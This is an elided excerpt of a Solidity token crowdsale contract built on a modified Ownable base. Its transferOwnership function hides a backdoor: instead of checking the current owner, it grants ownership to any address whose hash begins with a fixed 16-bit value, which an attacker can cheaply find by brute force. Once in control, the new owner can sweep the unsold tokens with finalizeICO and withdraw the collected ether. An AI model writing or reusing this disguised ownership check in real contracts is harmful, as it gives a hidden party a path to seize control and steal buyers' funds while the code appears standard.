...
abstract contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        require(uint(keccak256(abi.encodePacked(msg.sender)) >> 240) == 18630, "Ownable: failed");
...
contract Crowdsale is Context, ReentrancyGuard, Ownable {
    ...
    function buyTokens(address beneficiary) public nonReentrant payable {        
        ...
        require(_token.balanceOf(address(this)) >= tokens, "Crowdsale: There isn't enough balance in the contract.");
    ...
    function _getTokenAmount(uint256 weiAmount) internal view virtual returns (uint256) {
        return weiAmount.mul(_rate).mul(10 ** _decimals).div(10**18);
    }
    
    function finalizeICO() public onlyOwner {
        uint tokenBalance = _token.balanceOf(address(this));
        require(tokenBalance > 0, "Crowdsale: No tokens to withdraw");
        _deliverTokens(address(owner()), _token.balanceOf(address(this)));
    }

    function withdraw(address to) external onlyOwner {
        uint balance = address(this).balance;
        require(balance > 0, "Crowdsale: Nothing to withdraw");
